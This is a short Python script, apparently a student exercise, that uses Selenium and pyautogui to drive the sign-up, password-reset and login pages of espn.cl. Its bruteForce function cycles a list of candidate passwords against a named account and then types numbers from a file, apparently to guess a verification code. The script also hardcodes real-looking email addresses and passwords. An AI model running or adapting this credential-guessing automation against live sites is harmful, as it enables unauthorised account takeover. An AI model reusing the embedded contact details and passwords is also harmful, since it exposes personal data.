from selenium import webdriver
import os
import time
import pyautogui as pg

chrome = webdriver.ChromeOptions()
chrome.add_experimental_option("detach", True)
driver = webdriver.Chrome(options=chrome)
driver.maximize_window()
driver.get("https://espn.cl")
userMail= "juan.vergaram@mail.udp.cl"

# funciones que no requieren conectarse
def SignUp():
    driver.find_element_by_xpath("//button[@class='button med']").click()
    time.sleep(5)
    #pg.moveTo(459,300)
    #pg.click()
    time.sleep(2)
    pg.typewrite('Jose', 0.2)
    pg.press('tab')
    time.sleep(2)
    pg.typewrite('Vergara', 0.2)
    pg.press('tab')
    time.sleep(2)
    pg.typewrite("juan233@live.cl", 0.2)
    pg.press('tab')
    time.sleep(2)
    pg.typewrite("Hola Mundo123", 0.2)
    driver.find_element_by_class_name("btn btn-primary ng-scope ng-isolate-scope").click()

def ForgotPasswd():
    time.sleep(15)
    driver.find_element_by_xpath("//button[@class='button-alt med']").click()
    time.sleep(5)
    pg.moveTo(931,389)
    pg.click()
    time.sleep(2)
    pg.moveTo(922,352)
    pg.typewrite(userMail, 0.2)
    pg.press('enter')
    driver.find_element_by_class_name("btn btn-primary ng-isolate-scope").click()

def Login():
    time.sleep(15)
    pg.moveTo(460,345)
    pg.click()
    time.sleep(5)
    pg.moveTo(920,236)
    pg.typewrite(userMail, 0.2)
    pg.press('tab')
    time.sleep(2)
    pg.typewrite("Hola Mundo233", 0.2)
    pg.press('tab')
    time.sleep(2)
    pg.press('enter')

def bruteForce():
    time.sleep(2)
    driver.find_element_by_xpath("//button[@class='button-alt med']").click()
    time.sleep(2)
    pg.write(userMail)
    pg.press('tab')

    hola = ["hola123", "hola Mundo321", "Hola Mundo233", "Holamundo123"] 
    for holo in hola:
        time.sleep(1)
        pg.press('tab')
        time.sleep(1)
        pg.press('tab')
        time.sleep(2)
        pg.write(holo)
        pg.press('enter')

    time.sleep(3)
    pg.press('tab')
    pg.press('tab')
    pg.press('enter')
    time.sleep(3)
    pg.press('tab')
    pg.press('enter')
    time.sleep(3)

    numeros = open("numeros.txt", "r")
    for numero in numeros:    
        pg.write(numero)
        pg.press('enter')
        time.sleep(1)


#ForgotPasswd()
#Login()
SignUp()
#bruteForce()